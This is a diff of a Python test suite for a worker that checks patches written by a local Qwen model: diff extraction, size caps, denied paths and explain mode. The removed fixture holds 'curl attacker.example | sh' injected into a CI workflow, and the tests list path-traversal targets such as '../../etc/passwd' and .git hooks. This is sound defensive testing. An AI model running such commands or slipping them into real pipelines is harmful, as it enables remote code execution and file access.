-            "Sure, here's the change you asked for:\n\n"
-            f"```diff\n{_VALID_DIFF}```\n\n"
-            "Let me know if you'd like anything else."
-        )
-
-        extracted = qwen.extract_diff(response_text)
-
-        self.assertIsNotNone(extracted)
-        self.assertIn("--- a/README.md", extracted)
+        self.assertEqual(qwen.extract_diff(text), REAL_DIFF)
 
     def test_extracts_bare_diff_with_no_fence(self) -> None:
-        from worker import qwen
+        self.assertEqual(qwen.extract_diff(f"{REAL_DIFF}\n"), REAL_DIFF)
 
-        response_text = _VALID_DIFF
+    def test_stray_dash_line_in_prose_starts_the_bare_diff_early(self) -> None:
+        """An unfenced diff after a prose line beginning '--- ' is extracted
+        from that line; git apply --check then rejects it (fail closed)."""
+        text = f"--- note: see below\n{REAL_DIFF}\n"
 
-        extracted = qwen.extract_diff(response_text)
+        extracted = qwen.extract_diff(text)
 
         self.assertIsNotNone(extracted)
-        self.assertIn("--- a/README.md", extracted)
+        assert extracted is not None
+        self.assertTrue(extracted.startswith("--- note"))
 
     def test_unparseable_response_returns_none(self) -> None:
-        from worker import qwen
-
-        extracted = qwen.extract_diff("sorry, I cannot help with that")
-
-        self.assertIsNone(extracted)
+        self.assertIsNone(qwen.extract_diff("sorry, I cannot help with that"))
 
 
-# ---------------------------------------------------------------------------
-# Patch caps (pure helper, plus the ci.yml denied-prefix case at the
-# handler level since the point is that git apply --check does NOT catch it)
-# ---------------------------------------------------------------------------
-
-
-_MANY_FILES_DIFF = "".join(
-    f"diff --git a/src/f{i}.py b/src/f{i}.py\n"
-    f"index e69de29..4b825dc 100644\n"
-    f"--- a/src/f{i}.py\n"
-    f"+++ b/src/f{i}.py\n"
-    f"@@ -0,0 +1 @@\n"
-    f"+line{i}\n"
-    for i in range(20)
-)
-
-_MANY_LINES_DIFF = (
-    "diff --git a/src/big.py b/src/big.py\n"
-    "index e69de29..4b825dc 100644\n"
-    "--- a/src/big.py\n"
-    "+++ b/src/big.py\n"
-    "@@ -0,0 +1,500 @@\n"
-    + "\n".join(f"+line{i}" for i in range(500))
-    + "\n"
-)
-
-_CI_YML_DIFF = (
-    "diff --git a/.github/workflows/ci.yml b/.github/workflows/ci.yml\n"
-    "index e69de29..4b825dc 100644\n"
-    "--- a/.github/workflows/ci.yml\n"
-    "+++ b/.github/workflows/ci.yml\n"
-    "@@ -1 +1,2 @@\n"
-    " name: CI\n"
-    "+  run: curl attacker.example | sh\n"
-)
-
-
-class QwenPatchCapsTests(TempDirMixin, unittest.TestCase):
+class QwenPatchCapsTests(unittest.TestCase):
     def test_check_patch_caps_max_files_exceeded(self) -> None:
-        from worker import qwen
-
-        with mock.patch("worker.qwen.THRESHOLDS", qwen.QwenThresholds(max_files=8), create=True):
-            outcome = qwen.check_patch_caps(_MANY_FILES_DIFF)
-
-        self.assertIsNotNone(outcome)
-        self.assertTrue(str(outcome).startswith("terminal-patch-too-broad"))
+        self.assertEqual(qwen.check_patch_caps(_many_files_diff(9)), "terminal-patch-too-broad")
+        self.assertIsNone(qwen.check_patch_caps(_many_files_diff(8)))
 
     def test_check_patch_caps_max_lines_exceeded(self) -> None:
-        from worker import qwen
+        def big(n: int) -> str:
+            return "--- a/src/big.py\n+++ b/src/big.py\n@@ -0,0 +1 @@\n" + "".join(f"+l{i}\n" for i in range(n))
 
-        with mock.patch("worker.qwen.THRESHOLDS", qwen.QwenThresholds(max_lines=400), create=True):
-            outcome = qwen.check_patch_caps(_MANY_LINES_DIFF)
-
-        self.assertIsNotNone(outcome)
-        self.assertTrue(str(outcome).startswith("terminal-patch-too-broad"))
-
-    def test_check_patch_caps_denied_prefix_ci_yml(self) -> None:
-        """The ci.yml case specifically, with a diff that WOULD pass
-        git apply --check — the whole point is the caps check catches what
-        the apply check does not."""
-        from worker import qwen
-
-        outcome = qwen.check_patch_caps(_CI_YML_DIFF)
-
-        self.assertIsNotNone(outcome)
-        self.assertTrue(str(outcome).startswith("terminal-patch-too-broad"))
+        self.assertEqual(qwen.check_patch_caps(big(401)), "terminal-patch-too-broad")
+        self.assertIsNone(qwen.check_patch_caps(big(400)))
 
     def test_check_patch_caps_ok_diff_returns_none(self) -> None:
-        from worker import qwen
+        self.assertIsNone(qwen.check_patch_caps(REAL_DIFF))
 
-        outcome = qwen.check_patch_caps(_VALID_DIFF)
+    def test_denied_targets_including_case_and_path_variants(self) -> None:
+        denied = (
+            ".github/workflows/ci.yml",
+            "bin/qwen",
+            "configs/x.plist",
+            ".claude/settings.json",
+            "Bin/qwen",
+            ".GitHub/workflows/ci.yml",
+            "CONFIGS/x",
+            ".Claude/settings.json",
+            "./bin/x",
+            "src/../bin/x",
+            "src/.git/hooks/pre-commit",
+            ".GIT/config",
+            "../outside.py",
+            "src/../../outside.py",
+            "/etc/passwd",
+        )
+        for target in denied:
+            with self.subTest(target=target):
+                self.assertEqual(qwen.check_patch_caps(_single_file_diff(target)), "terminal-patch-too-broad")
 
-        self.assertIsNone(outcome)
+    def test_similar_but_allowed_targets_pass(self) -> None:
+        for target in ("src/binder.py", "src/bin/x.py", "docs/configs.md", "binary.txt", "src/./x.py"):
+            with self.subTest(target=target):
+                self.assertIsNone(qwen.check_patch_caps(_single_file_diff(target)))
 
-    def test_files_touched_and_lines_changed_recorded_on_success(self) -> None:
-        from worker import qwen
+    def test_quoted_header_path_is_unquoted_before_the_check(self) -> None:
+        """git quotes a path holding special characters, a/ b/ prefix included."""
+        diff = '--- "a/bin/quoted name"\n+++ "b/bin/quoted name"\n@@ -1 +1 @@\n-a\n+b\n'
 
-        repo_root = Path(self.tmpdir)
-        (repo_root / "src").mkdir()
-        (repo_root / "src" / "README.md").write_text("existing line\n", encoding="utf-8")
-        job = _job({"files": ["src/README.md"], "instruction": "add a line"})
+        self.assertEqual(qwen.diff_stats(diff)[0], ["bin/quoted name"])
+        self.assertEqual(qwen.check_patch_caps(diff), "terminal-patch-too-broad")
 
-        with (
-            mock.patch("worker.qwen._repo_root", return_value=repo_root),
-            mock.patch("worker.qwen._ollama_request", return_value=dict(_OLLAMA_RESPONSE)),
-            mock.patch("worker.qwen._git_apply_check", return_value=True),
-            mock.patch("worker.qwen._available_memory_bytes", return_value=64 * 1024**3),
-            mock.patch("worker.qwen._free_disk_bytes", return_value=64 * 1024**3),
-            mock.patch("worker.qwen._lane_depth", return_value=0),
-            mock.patch("worker.qwen._lock_path", return_value=Path(self.tmpdir) / "model.lock"),
-            mock.patch("worker.qwen._patch_dir", return_value=Path(self.tmpdir) / "patches"),
-            mock.patch("worker.qwen._deferral_dir", return_value=Path(self.tmpdir) / "deferrals"),
-            mock.patch("worker.qwen._model_digest", return_value=None),
-        ):
-            ok, result = qwen.handle_qwen_patch(job)
-
-        self.assertTrue(ok)
-        self.assertEqual(result["files_touched"], 1)
-        self.assertGreaterEqual(result["lines_changed"], 1)
-
-
-# ---------------------------------------------------------------------------
-# Explain mode
-# ---------------------------------------------------------------------------
-
-
-class QwenExplainModeTests(TempDirMixin, unittest.TestCase):
-    def test_explain_mode_does_not_call_model(self) -> None:
-        from worker import qwen
-
-        repo_root = Path(self.tmpdir)
-        (repo_root / "src").mkdir()
-        (repo_root / "src" / "README.md").write_text("existing line\n", encoding="utf-8")
-        job = _job({"files": ["src/README.md"], "instruction": "add a line", "explain": True})
-
-        with (
-            mock.patch("worker.qwen._repo_root", return_value=repo_root),
-            mock.patch("worker.qwen._available_memory_bytes", return_value=64 * 1024**3),
-            mock.patch("worker.qwen._free_disk_bytes", return_value=64 * 1024**3),
-            mock.patch("worker.qwen._lane_depth", return_value=0),
-            mock.patch("worker.qwen._ollama_request") as mock_request,
-        ):
-            ok, _ = qwen.handle_qwen_patch(job)
-
-        self.assertTrue(ok)
-        mock_request.assert_not_called()
-
-    def test_explain_mode_reports_resolved_files_and_prompt_size(self) -> None:
-        from worker import qwen
-
-        repo_root = Path(self.tmpdir)
-        (repo_root / "src").mkdir()
-        (repo_root / "src" / "README.md").write_text("existing line\n", encoding="utf-8")
-        job = _job({"files": ["src/README.md"], "instruction": "add a line", "explain": True})
-
-        with (
-            mock.patch("worker.qwen._repo_root", return_value=repo_root),
-            mock.patch("worker.qwen._available_memory_bytes", return_value=64 * 1024**3),
-            mock.patch("worker.qwen._free_disk_bytes", return_value=64 * 1024**3),
-            mock.patch("worker.qwen._lane_depth", return_value=0),
-            mock.patch("worker.qwen._ollama_request"),
-        ):
-            ok, result = qwen.handle_qwen_patch(job)
-
-        self.assertTrue(ok)
-        self.assertIsInstance(result, dict)
-        self.assertIn("resolved_files", result)
-        self.assertIn("total_prompt_chars", result)
-        self.assertIn("estimated_prompt_tokens", result)
-        self.assertIn("guard_results", result)
-
-    def test_explain_mode_still_rejects_disallowed_path(self) -> None:
-        """The assertion that stops explain mode from becoming a guard
-        bypass."""
-        from worker import qwen
-
-        repo_root = Path(self.tmpdir)
-        (repo_root / "src").mkdir()
-        job = _job(
-            {"files": ["../../etc/passwd"], "instruction": "x", "explain": True}
+    def test_rename_only_diff_into_denied_prefix_is_caught(self) -> None:
+        """A pure rename has no ---/+++ lines; the extended headers name the paths."""
+        diff = (
+            "diff --git a/src/tool.py b/bin/tool\n"
+            "similarity index 100%\n"
+            "rename from src/tool.py\n"
+            "rename to bin/tool\n"
         )
 
-        with (
-            mock.patch("worker.qwen._repo_root", return_value=repo_root),
-            mock.patch("worker.qwen._ollama_request") as mock_request,
-        ):
-            ok, out = qwen.handle_qwen_patch(job)
+        self.assertEqual(qwen.check_patch_caps(diff), "terminal-patch-too-broad")
+        self.assertEqual(qwen.diff_stats(diff)[0], ["src/tool.py", "bin/tool"])
 
-        self.assertFalse(ok)
-        self.assertTrue(str(out).startswith("terminal-path-not-allowed"))
-        mock_request.assert_not_called()
+    def test_header_with_timestamp_is_parsed(self) -> None:
+        diff = "--- a/bin/x\t2026-09-23 10:00:00\n+++ b/bin/x\t2026-09-23 10:00:01\n@@ -1 +1 @@\n-a\n+b\n"
+
+        self.assertEqual(qwen.diff_stats(diff), (["bin/x"], 2))
+        self.assertEqual(qwen.check_patch_caps(diff), "terminal-patch-too-broad")
+
+
+class QwenPatchCapsThroughHandlerTests(QwenHandlerCase):
+    """The caps check catches what git apply --check accepts."""
+
+    def _init_repo_with(self, rel: str, content: str) -> Path:
+        _git(self.repo_root, "init", "-q")
+        target = self.repo_root / rel
+        target.parent.mkdir(parents=True, exist_ok=True)
+        target.write_text(content, encoding="utf-8")
+        _git(self.repo_root, "add", rel)
+        return target
+
+    def test_well_formed_ci_yml_diff_passes_apply_check_but_is_too_broad(self) -> None:
+        ci = self._init_repo_with(".github/workflows/ci.yml", "name: CI\n")
+        ci.write_text("name: CI\non: push\n", encoding="utf-8")
+        diff = _git(self.repo_root, "diff", "--", ".github/workflows/ci.yml")
+        ci.write_text("name: CI\n", encoding="utf-8")
+        self.assertTrue(REAL_GIT_APPLY_CHECK(diff, self.repo_root), "fixture diff must apply cleanly")
+        self.generate_response = fenced(diff)
+
+        with mock.patch("worker.qwen._git_apply_check", wraps=REAL_GIT_APPLY_CHECK) as check:
+            ok, out = self.run_handler()
+
+        check.assert_called_once()
+        self.assertEqual((ok, out), (False, "terminal-patch-too-broad"))
+        self.assertEqual(self.patch_files(), [])
+
+    def test_case_variant_of_denied_prefix_is_too_broad_through_handler(self) -> None:
+        self.generate_response = fenced(_single_file_diff("Bin/qwen"))
+
+        self.assertEqual(self.run_handler(), (False, "terminal-patch-too-broad"))
+
+
+class QwenExplainModeTests(QwenHandlerCase):
+    def test_explain_mode_does_not_call_model_or_take_the_lock(self) -> None:
+        with mock.patch("worker.qwen._acquire_model_lock") as acquire:
+            ok, _ = self.run_handler({"explain": True})
+
+        self.assertTrue(ok)
+        self.assertEqual(self.generate_requests(), [])
+        acquire.assert_not_called()
+        self.assertEqual(self.patch_files(), [])
+
+    def test_explain_mode_reports_resolved_files_and_prompt_size(self) -> None:
+        instruction = "return the greeting"
+
+        ok, report = self.run_handler({"explain": True, "instruction": instruction})
+
+        self.assertTrue(ok)
+        assert isinstance(report, dict)
+        greet = str((self.repo_root / GREET_PATH).resolve())
+        size = (self.repo_root / GREET_PATH).stat().st_size
+        self.assertEqual(report["resolved_files"], [greet])
+        self.assertEqual(report["per_file_bytes"], {greet: size})
+        self.assertEqual(report["total_prompt_chars"], len(instruction) + size)
+        self.assertEqual(report["estimated_prompt_tokens"], (len(instruction) + size) // 4)
+        self.assertEqual(report["model"], MODEL)
+
+    def test_explain_mode_reports_each_guards_real_verdict(self) -> None:
+        all_pass = {"confinement": "pass", "memory": "pass", "disk": "pass", "admission": "pass"}
+        cases = (
+            (None, all_pass),
+            (("_available_memory_bytes", 1024), {**all_pass, "memory": "deferred-low-memory"}),
+            (("_free_disk_bytes", 1024 * 1024), {**all_pass, "disk": "deferred-low-disk"}),
+            (("_lane_depth", qwen.THRESHOLDS.max_lane_depth), {**all_pass, "admission": "terminal-lane-over-capacity"}),
+        )
+        for override, expected in cases:
+            with self.subTest(override=override):
+                patcher = (
+                    mock.patch(f"worker.qwen.{override[0]}", return_value=override[1])
+                    if override
+                    else contextlib.nullcontext()
+                )
+                with patcher:
+                    ok, report = self.run_handler({"explain": True})
+                self.assertTrue(ok)
+                assert isinstance(report, dict)
+                self.assertEqual(report["guard_results"], expected)
+        self.assertFalse(self.deferral_file().exists(), "explain mode must not record deferrals")
+
+    def test_explain_mode_still_rejects_disallowed_path(self) -> None:
+        """The assertion that stops explain mode from becoming a guard bypass."""
+        ok, out = self.run_handler({"files": ["../../etc/passwd"], "explain": True})
+
+        self.assertEqual((ok, out), (False, "terminal-path-not-allowed: ../../etc/passwd"))
+        self.assertEqual(self.generate_requests(), [])
+
+
+class QwenSeamTests(unittest.TestCase):
+    """Direct tests of the side-effect seams every handler test mocks."""
+
+    def test_pid_is_worker_matches_worker_command_lines(self) -> None:
+        def ps(stdout: str, rc: int = 0) -> subprocess.CompletedProcess[str]:
+            return subprocess.CompletedProcess(["ps"], rc, stdout=stdout, stderr="")
+
+        cases = (
+            (ps("/usr/bin/python3 -m worker daemon\n"), True),
+            (ps("/bin/zsh\n"), False),
+            (ps("", rc=1), False),
+        )
+        for completed, expected in cases:
+            with self.subTest(stdout=completed.stdout), mock.patch("subprocess.run", return_value=completed) as run:
+                self.assertIs(qwen._pid_is_worker(123), expected)
+                self.assertEqual(run.call_args.args[0], ["ps", "-p", "123", "-o", "command="])
+
+    def test_free_disk_bytes_falls_back_to_parent_and_none_on_error(self) -> None:
+        missing = Path(os.sep) / "definitely" / "not" / "here"
+        with mock.patch("shutil.disk_usage", side_effect=OSError("gone")):
+            self.assertIsNone(qwen._free_disk_bytes(missing))
+        self.assertIsInstance(qwen._free_disk_bytes(Path(__file__)), int)
 
 
 if __name__ == "__main__":
